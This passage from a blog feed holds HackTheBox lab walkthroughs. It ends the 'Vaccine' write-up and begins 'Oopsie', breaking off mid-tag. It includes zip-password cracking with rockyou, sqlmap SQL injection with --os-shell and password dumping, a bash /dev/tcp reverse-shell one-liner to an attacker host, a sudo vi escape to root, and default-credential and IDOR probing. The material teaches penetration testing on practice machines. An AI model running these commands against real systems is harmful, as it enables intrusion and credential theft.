Nmap done: 1 IP address (1 host up) scanned in 15.44 seconds</code></pre><p>&#x200C;There are 3 main ports. Look at the SSH version info, the machine flavor is <a href="https://launchpad.net/ubuntu/+source/openssh/1:8.0p1-6build1" rel="noopener noreferrer"><code>Ubuntu Eoan</code></a>. &#xA0;And also some website is running on port 80 and Nmap indicate it as MegaCrop Login. Let&apos;s look what is inside ftp first.</p><h3 id="013-discover-more-on-port-21">01.3 Discover more on port 21</h3><p>Do you remember that we had some ftp credentials from our previous box(Oopsie)? So, let&#x2019;s use them and check the login to ftp service.</p><ul><li>ftpuser : mc@F1l3ZilL4</li></ul><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Vaccine]
&#x2514;&#x2500;# ftp 10.10.10.46
Connected to 10.10.10.46.
220 (vsFTPd 3.0.3)
Name (10.10.10.46:root): ftpuser
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp&gt;</code></pre><p>We successfully logged in to the ftp server as ftpuser. Again let&apos;s enumerate to find any other thing.</p><pre><code class="language-bash">ftp&gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0            2533 Feb 03  2020 backup.zip
226 Directory send OK.</code></pre><p>There is a backup.zip file in this ftp server. Before we check what is inside that zip file, we are going to download it to our machine.</p><blockquote>we can use <code>get filename </code>command to download any file from ftp server. Click <a href="https://www.serv-u.com/linux-ftp-server/commands" rel="noopener noreferrer">here </a>if you need learn ftp basic commands. &#x1F60E;&#x1F60E;</blockquote><pre><code class="language-bash">ftp&gt; get backup.zip
local: backup.zip remote: backup.zip
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for backup.zip (2533 bytes).
226 Transfer complete.
2533 bytes received in 0.00 secs (8.5359 MB/s)</code></pre><p>We can use unzip for extract any basic zip file. Here we can see index.php file but the zip file is protected by some kind of password.</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Vaccine]
&#x2514;&#x2500;# ls
AllPorts.nmap  backup.zip  DetailPorts.nmap

&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Vaccine]
&#x2514;&#x2500;# unzip backup.zip
Archive:  backup.zip
[backup.zip] index.php password:</code></pre><p>We can check passwords from previous machines but trust me nothing works. It means we need to crack that zip file and grab the password. There are so many tools to crack zip file password. But I prefer using &#xA0;<a href="https://manpages.ubuntu.com/manpages/trusty/man1/fcrackzip.1.html" rel="noopener noreferrer"><code>fcrackzip</code></a></p><p>To install fcrackzip, type the following command and hit enter. &#x1F601;&#x1F601;</p><pre><code class="language-bash"> apt-get install fcrackzip
</code></pre><p>If you are on your <strong>very first time to use</strong> rockyou word list, you need to extract it.</p><pre><code class="language-bash">gunzip /usr/share/wordlists/rockyou.txt.gz</code></pre><pre><code class="language-bash">fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip</code></pre><pre><code class="language-bash">-u	: Use unzip to weed out wrong passwords
-D	: Use a dictionary
-p	: Use string as initial password/file</code></pre><p>Here is the output &#x1F447;</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Vaccine]
&#x2514;&#x2500;# fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt backup.zip


PASSWORD FOUND!!!!: pw == 741852963</code></pre><p>As you can feel it&apos;s too fast than using John the Ripper, isn&apos;t it? Now we have password, so... let&apos;s unzip that archive to get <code>index.php</code> file.</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Vaccine]
&#x2514;&#x2500;# unzip backup.zip
Archive:  backup.zip
[backup.zip] index.php password:
  inflating: index.php
  inflating: style.css</code></pre><p>Oh! there is a css file also. First of all, check index.php file.</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Vaccine]
&#x2514;&#x2500;# head index.php
&lt;!DOCTYPE html&gt;
&lt;?php
session_start();
  if(isset($_POST[&apos;username&apos;]) &amp;&amp; isset($_POST[&apos;password&apos;])) {
    if($_POST[&apos;username&apos;] === &apos;admin&apos; &amp;&amp; md5($_POST[&apos;password&apos;]) === &quot;2cb42f8734ea607eefed3b70af13bbd3&quot;) {
      $_SESSION[&apos;login&apos;] = &quot;true&quot;;
      header(&quot;Location: dashboard.php&quot;);
    }
  }
?&gt;</code></pre><p>By looking at the very first lines, we can see the credentials. But here, the password is in md5 hash format. Let&apos;s try to decode it using online <a href="https://crackstation.net/" rel="noopener noreferrer">crackstation </a>site.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-26.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1323" height="497" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-26.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-26.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-26.png 1323w" sizes="(min-width: 720px) 720px"></figure><p><br>Oh! what a simple password. So now the credentials are,</p><ul><li>admin : qwerty789</li></ul><h3 id="014-discover-more-on-port-80">01.4 Discover more on port 80</h3><p>Now let&apos;s jump to the port 80, Here we have MegaCrop login page and now we have the credentials. Let&apos;s use it to login. What the hell, I think we could simply get that password if we brute forced that login page using rockyou password list. Isn&apos;t it? &#x1F926;&#x200D;&#x2642;&#xFE0F;</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-27.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1276" height="759" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-27.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-27.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-27.png 1276w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-28.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1267" height="740" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-28.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-28.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-28.png 1267w" sizes="(min-width: 720px) 720px"></figure><p>Finally, we have only one function on this site and it is search option. Let&apos;s fire up Burp Suite and check what are the requests going through.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-29.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1658" height="780" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-29.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-29.png 1000w, http://192.168.8.3:2368/content/images/size/w1600/2021/05/image-29.png 1600w, http://192.168.8.3:2368/content/images/2021/05/image-29.png 1658w" sizes="(min-width: 720px) 720px"></figure><p>&#x200C;When looking at the request, &#xA0;a lot of vulnerabilities came to my head but nothing worked except <code>SQL Injection</code>.</p><hr><h2 id="02-foothold">02. Foothold</h2><p>Let&apos;s jump to <code>sqlmap</code> . As you can see here, the request is a GET request. You can simply add <code>*</code> to your value of parameter (in this case it is search) which you want to scan. But keep in mind that we now have access to the system. It means, to use search function you must need a valid session token. So we are going to pass the &#xA0;<strong>PHPSESSID </strong>as a cookie parameter.</p><pre><code class="language-bash">sqlmap http://10.10.10.46/dashboard.php?search=* --cookie PHPSESSID=3gl7g1ujsq2i3cpigk4521lk8p --dbs --batch</code></pre><pre><code class="language-bash">--dbs	: get the database list
--batch	: Never ask for user input, use the default behavior</code></pre><blockquote>Click <a href="https://gist.github.com/jkullick/03b98b1e44f03986c5d1fc69c092220d" rel="noopener noreferrer">here </a>If you need SQLMap Cheat Sheet</blockquote><p>Here is the output &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-30.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1325" height="667" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-30.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-30.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-30.png 1325w" sizes="(min-width: 720px) 720px"></figure><p>When looking at the output we can see that there are 3 main databases. You can enumerate all the tables and fetch data from the databases.</p><h3 id="021-get-user-shell">02.1 Get User Shell</h3><p>There are 2 main ways to get user shell in this box.</p><ul><li>Using SQLMap <code>--os-shell</code> command.</li><li>Enumerating all the tables.</li></ul><p>Here I will show the 1st step: We could use the SQLMap flag <code>--os-shell</code> to gain a shell and after that gain an upgraded reverse shell with the next commands. However I lost the connection sometimes with this method. Anyway first try it out. It&apos;s very simple, type bellow command on your terminal.</p><pre><code class="language-bash">sqlmap http://10.10.10.46/dashboard.php?search=* --cookie PHPSESSID=3gl7g1ujsq2i3cpigk4521lk8p --os-shell --batch</code></pre><p>Then your shell will look like this &#x1F447;&#x1F447;</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-31.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="761" height="242" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-31.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-31.png 761w" sizes="(min-width: 720px) 720px"></figure><p><br>Now, time to upgrade that ugly shell. &#x1F385;&#x1F385; Start netcat listener on whatever port you like (In this case it&apos;s 4848) and run below command on os-shell.&#x1F447;</p><pre><code class="language-bash">bash -c &apos;bash -i &amp;&gt;/dev/tcp/&lt;YourIP&gt;/4848 &lt;&amp;1&apos; &amp;</code></pre><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-32.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1452" height="311" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-32.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-32.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-32.png 1452w" sizes="(min-width: 720px) 720px"></figure><p>Let&apos;s check the 2nd step: Now we need to enumerate the database and to find users and the passwords. So let&apos;s get started.</p><p>Without enumerate the table one by one we can use a simple command to find the passwords on the database using <code>--password</code> flag.&#x1F474;&#x1F474; Pretty cool right? &#x1F929;</p><pre><code class="language-bash">sqlmap http://10.10.10.46/dashboard.php?search=* --cookie PHPSESSID=3gl7g1ujsq2i3cpigk4521lk8p --batch --passwords
</code></pre><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-33.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="969" height="391" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-33.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-33.png 969w" sizes="(min-width: 720px) 720px"></figure><p><br>So we found one user <code>postgres</code> and the password from md5 hash format. I tried to crack this hash with john and hashcat, however a quick google search could save some time.(Remove the &apos;md5&apos; part beginning.)</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-34.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1235" height="643" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-34.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-34.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-34.png 1235w" sizes="(min-width: 720px) 720px"></figure><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-35.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="881" height="347" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-35.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-35.png 881w" sizes="(min-width: 720px) 720px"></figure><p>No we have new credentials, let&apos;s check them trough SSH.</p><p><code>postgres :P@s5w0rd!</code></p><p>I don&apos;t know why it hasn&apos;t got any user flag. Then I checked statistics on this box and it showed me this.&#x1F447;</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-36.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="1174" height="527" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-36.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-36.png 1000w, http://192.168.8.3:2368/content/images/2021/05/image-36.png 1174w" sizes="(min-width: 720px) 720px"></figure><p>This means we have no any user.txt in this box. Let&apos;s find root.txt.</p><hr><h3 id="03-privilege-escalation-%E2%80%A6">03. Privilege Escalation &#x2026;</h3><p>First thing first! Let&apos;s check what are the commands that we can run as super user permission.</p><pre><code class="language-bash">sudo -l</code></pre><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Vaccine]
&#x2514;&#x2500;# ssh postgres@10.10.10.46                                                                                          
postgres@10.10.10.46&apos;s password:
Welcome to Ubuntu 19.10 (GNU/Linux 5.3.0-29-generic x86_64)
    &lt;snap&gt;
    &lt;/snap&gt;
Last login: Thu May 20 06:33:36 2021 from 10.10.14.11
postgres@vaccine:~$ sudo -l
[sudo] password for postgres:
Matching Defaults entries for postgres on vaccine:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User postgres may run the following commands on vaccine:
    (ALL) /bin/vi /etc/postgresql/11/main/pg_hba.conf
postgres@vaccine:~$</code></pre><p>Looks like we can run the command &#x201C;<code>/bin/vi /etc/postgresql/11/main/pg_hba.conf</code>&#x201D; as <code>sudo</code>, So by running it and adding &#x201C;<code>:!/bin/bash</code>&#x201D; inside the vi editor, we got ourselves a root shell.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-37.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="503" height="106"></figure><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-38.png" class="kg-image" alt="Vaccine Walkthrough" loading="lazy" width="875" height="775" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-38.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-38.png 875w" sizes="(min-width: 720px) 720px"></figure><p><strong>Find me on </strong><a href="https://twitter.com/ShapManasick" rel="noopener noreferrer">@twitter</a></p>]]></content:encoded></item><item><title><![CDATA[Oopsie Walkthrough]]></title><description><![CDATA[<p>After the Archetype Walkthrough, here i&apos;m with Oopsie box. Let&apos;s hack and grab the flags.</p><hr><p>In ours pervious Archetype Walkthrough, I mentioned that the starting point machines are a series of 9 easily rated machines that should be<strong> rooted in a sequence</strong>. So it means, if</p>]]></description><link>http://192.168.8.3:2368/starting-point-htb-oopsie-walkthrough/</link><guid isPermaLink="false">60aebb4154f7b1d506ddb9a5</guid><category><![CDATA[HackTheBox]]></category><category><![CDATA[HarithDilshan]]></category><category><![CDATA[StartingPoint]]></category><category><![CDATA[h4rithd]]></category><category><![CDATA[Oopsie Walkthrough]]></category><category><![CDATA[HTB Walkthrough]]></category><category><![CDATA[HTB Writeup]]></category><category><![CDATA[Writeup]]></category><category><![CDATA[Oopsie]]></category><dc:creator><![CDATA[Harith Dilshan]]></dc:creator><pubDate>Wed, 28 Apr 2021 21:19:00 GMT</pubDate><media:content url="http://192.168.8.3:2368/content/images/2021/05/2-2.jpg" medium="image"/><content:encoded><![CDATA[<img src="http://192.168.8.3:2368/content/images/2021/05/2-2.jpg" alt="Oopsie Walkthrough"><p>After the Archetype Walkthrough, here i&apos;m with Oopsie box. Let&apos;s hack and grab the flags.</p><hr><p>In ours pervious Archetype Walkthrough, I mentioned that the starting point machines are a series of 9 easily rated machines that should be<strong> rooted in a sequence</strong>. So it means, if you need to go through this box, you must have a complete <a href="https://h4rithd.com/blog/starting-point-htb-archetype-walkthrough/index.html">Archetype</a> machine.</p><p>Enough talks &#x1F971;, let&apos;s start to hack. &#x1F431;&#x200D;&#x1F4BB;</p><blockquote><strong>Disclaimers: </strong>No flags (user/root) are shown in this writeup (as usual in writeups), so follow the procedures to grab the flags! &#x1F431;&#x200D;&#x1F464;</blockquote><hr><h2 id="00-start-machine-%E2%80%A6">00. Start Machine &#x2026;</h2><p>To start machine, Just click &quot;Join Machine&quot;.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="http://192.168.8.3:2368/content/images/2021/05/image-6.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1636" height="761" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-6.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-6.png 1000w, http://192.168.8.3:2368/content/images/size/w1600/2021/05/image-6.png 1600w, http://192.168.8.3:2368/content/images/2021/05/image-6.png 1636w" sizes="(min-width: 720px) 720px"><figcaption>Start Oopsie Machine</figcaption></figure><p>Then you can see the <strong>IP</strong> address for that machine. usually it is <strong>10.10.10.28 &#x1F920;</strong></p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="http://192.168.8.3:2368/content/images/2021/05/image-7.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="429" height="525"><figcaption>10.10.10.28</figcaption></figure><p>Before going enumeration steps we can simply ping to the IP address and check our VPN connection and whether the machine is alive. Sometimes the machines might &quot;Disable&quot; ping requests from passing through the firewall. But in most cases ping will be a success!</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Oopsie]
&#x2514;&#x2500;# ping 10.10.10.28 -c 2
PING 10.10.10.28 (10.10.10.28) 56(84) bytes of data.
64 bytes from 10.10.10.28: icmp_seq=1 ttl=63 time=268 ms
64 bytes from 10.10.10.28: icmp_seq=2 ttl=63 time=282 ms

--- 10.10.10.28 ping statistics ---
2 packets transmitted, 2 received, 0% packet loss, time 1001ms
rtt min/avg/max/mdev = 267.817/274.911/282.006/7.094 ms</code></pre><p>As a ping result, It&apos;s TTL=63. There is one route between machine and us (VPN) so it&apos;s definitely it will be Linux machine.</p><hr><h2 id="01-enumeration-first-%E2%80%A6">01. Enumeration First &#x2026;</h2><h3 id="%E2%80%8C011-fast-ports-scan">&#x200C;01.1 Fast ports scan</h3><p>As usual, run Nmap fast scan for all TCP ports to identify the ports which are open.</p><pre><code class="language-bash">nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.28</code></pre><pre><code class="language-bash">-n  : Never do DNS resolution
-vv	: Extra verbosity
--open	: Output only open ports
-p-	: Full TCP ports range (65535)
-T4	: Aggressive (4) speeds scans; assumes you are on a reasonably fast and reliable network</code></pre><p>Here is the output &#x1F447;</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Oopsie]
&#x2514;&#x2500;# nmap -n -vv --open -T4 -p- -oN AllPorts.nmap 10.10.10.28
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-16 05:28 EDT
Initiating Ping Scan at 05:28
Scanning 10.10.10.28 [4 ports]
Completed Ping Scan at 05:28, 0.29s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 05:28
Scanning 10.10.10.28 [65535 ports]
Discovered open port 80/tcp on 10.10.10.28
Discovered open port 22/tcp on 10.10.10.28
SYN Stealth Scan Timing: About 31.38% done; ETC: 05:29 (0:01:08 remaining)
Completed SYN Stealth Scan at 05:30, 108.95s elapsed (65535 total ports)
Nmap scan report for 10.10.10.28
Host is up, received echo-reply ttl 63 (0.32s latency).
Scanned at 2021-04-16 05:28:18 EDT for 109s
Not shown: 65533 closed ports
Reason: 65533 resets
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63           * (Interesting)
80/tcp open  http    syn-ack ttl 63           * (Interesting)

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 109.41 seconds
           Raw packets sent: 93007 (4.092MB) | Rcvd: 92692 (3.708MB)</code></pre><p>Now we know which ports are open, Here we can see some &#xA0;<strong>* (Interesting)</strong> ports.</p><h3 id="012-run-nmap-scripting-engine">01.2 Run Nmap Scripting Engine</h3><p>To get the best result we can run the <code>Nmap Scripting Engine</code> for all open ports. Now we know all the open ports. So we can point out and run the script engine as fast as possible.</p><pre><code class="language-bash">&#x250C;&#x2500;&#x2500;(root&#x1F480;Hidd3nWiki)-[~/Documents/Oopsie]
&#x2514;&#x2500;# nmap -sV -sC -oN DetailPorts.nmap -p 22,80 10.10.10.28
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-16 05:33 EDT
Nmap scan report for 10.10.10.28
Host is up (0.39s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA)
|   256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA)
|_  256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Welcome
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 26.81 seconds</code></pre><p>I have some trick to identify the Operating System using SSH version. I got it from <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA/videos" rel="noopener noreferrer">IppSec&apos;s </a>walkthroughs. Thanks <a href="https://www.youtube.com/channel/UCa6eh7gCkpPo5XXUDfygQQA/videos" rel="noopener noreferrer">IppSec </a>for your valuable walkthroughs &#x1F64F;. Here is the trick. If you see the SSH version like &quot;<strong>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3&quot; </strong>just copy it and search through google. In the search results you can find domain called launchpad.net. It contains some important details like Ubuntu Releases, last update, publishing details and more important is builds. Likewise, in this case it is &#xA0;Bionic.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-8.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1894" height="789" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-8.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-8.png 1000w, http://192.168.8.3:2368/content/images/size/w1600/2021/05/image-8.png 1600w, http://192.168.8.3:2368/content/images/2021/05/image-8.png 1894w" sizes="(min-width: 720px) 720px"></figure><p>Now we know the operating system is Ubuntu and we have open ports 22 (SSH) and 80 (HTTP). Let&apos;s go to the port 80 first.</p><h3 id="013-discover-more-on-port-80">01.3 Discover more on port 80</h3><p>Open web browser and Burp Suite. Type http://10.10.10.28/</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-9.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1708" height="783" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-9.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-9.png 1000w, http://192.168.8.3:2368/content/images/size/w1600/2021/05/image-9.png 1600w, http://192.168.8.3:2368/content/images/2021/05/image-9.png 1708w" sizes="(min-width: 720px) 720px"></figure><p>Here we got a nice landing page. First thing first; view source code and look if we have any interesting things. Unfortunately, nothing interesting found. Then we can see the traffic on burp.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-10.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="713" height="258" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-10.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-10.png 713w"></figure><p>In here, you can find some endpoint, so let&apos;s jump into it.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-11.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="609" height="211" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-11.png 600w, http://192.168.8.3:2368/content/images/2021/05/image-11.png 609w"></figure><p>But I got nothing, it&apos;s just a blank page. Hmm, what about &quot;<a href="http://10.10.10.28/cdn-cgi/login/" rel="noopener noreferrer">http://10.10.10.28/cdn-cgi/login/</a>&quot; ah, let&apos;s check...</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-12.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1716" height="781" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-12.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-12.png 1000w, http://192.168.8.3:2368/content/images/size/w1600/2021/05/image-12.png 1600w, http://192.168.8.3:2368/content/images/2021/05/image-12.png 1716w" sizes="(min-width: 720px) 720px"></figure><p>It contains a login page. lets check basic default username password like,</p><ul><li>admin : admin</li><li>admin : admin123</li><li>admin : password</li><li>admin : pa$$w0rd</li></ul><p>Nothing worked.&#x1F622; Oh wait, wait.. Do you remember we got some password at the end of Archetype machine? Try to remember, it was &quot;<strong>MEGACORP_4dm1n!!</strong>&quot;. Let&apos;s check this one as well.</p><p><code>admin : MEGACORP_4dm1n!!</code></p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-13.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1723" height="783" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-13.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-13.png 1000w, http://192.168.8.3:2368/content/images/size/w1600/2021/05/image-13.png 1600w, http://192.168.8.3:2368/content/images/2021/05/image-13.png 1723w" sizes="(min-width: 720px) 720px"></figure><p>We got our admin panel. and now it&apos;s time to check page source. so let&apos;s check page source.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MYPAy_4MiWDii2x1cWn%2F-MYPhbB-Fm0c88IOadpK%2Fimage.png?alt=media&amp;token=0c9f6fd5-c38e-4830-bc3e-4c81b7c99bac" class="kg-image" alt="Oopsie Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">view-source:http://10.10.10.28/cdn-cgi/login/admin.php</div><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p><br>Here we have some interesting links. let&apos;s check one-by-one.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-14.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1912" height="491" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-14.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-14.png 1000w, http://192.168.8.3:2368/content/images/size/w1600/2021/05/image-14.png 1600w, http://192.168.8.3:2368/content/images/2021/05/image-14.png 1912w" sizes="(min-width: 720px) 720px"></figure><p><br>In upload section they say &quot;if you need to upload anything, please be a <strong>superadmin </strong>!&quot;. hmm ok let&apos;s check other ones.</p><figure class="kg-card kg-image-card"><img src="http://192.168.8.3:2368/content/images/2021/05/image-15.png" class="kg-image" alt="Oopsie Walkthrough" loading="lazy" width="1915" height="512" srcset="http://192.168.8.3:2368/content/images/size/w600/2021/05/image-15.png 600w, http://192.168.8.3:2368/content/images/size/w1000/2021/05/image-15.png 1000w, http://192.168.8.3:2368/content/images/size/w1600/2021/05/image-15.png 1600w, http://192.168.8.3:2368/content/images/2021/05/image-15.png 1915w" sizes="(min-width: 720px) 720px"></figure><p>Oh!, now I smell some IDOR vulnerability. Isn&apos;t it ?? Let&apos;s check ..</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MYPAy_4MiWDii2x1cWn%2F-MYPicZwSy2d0RZl5MAh%2Fimage.png?alt=media&amp;token=b4068d78-e774-4c4d-bc11-fbfec16654f7" class="kg-image" alt="Oopsie Walkthrough" loading="lazy"><figcaption><span class="text-4505230f--TextH400-3033861f--textContentFamily-49a318e1" style="max-width: 100%;"><div style="display: inline-flex; max-width: 100%;"><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">IDOR in id=1</div><div style="position: absolute; top: 0px; left: 0px; visibility: hidden; height: 0px; overflow: scroll; white-space: pre; font-size: 16px; font-family: Content-font, Roboto, sans-serif; font-weight: 400; font-style: normal; letter-spacing: normal; text-transform: none;">Enter a caption for this image (optional)</div></div></span></figcaption></figure><p>I send this request to burp intruder and change settings like below &#x1F447;</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="https://gblobscdn.gitbook.com/assets%2F-MYKZU_ttgeJRDD_2odP%2F-MYPAy_4MiWDii2x1cWn%2F-MYPjCuHNPHV0nbERb7y%2Fimage.png?alt=media&amp;token=6bbf461c-f43c-4a99-858b-634b73788b23" class="kg-image" alt="Oopsie Walkthrough" 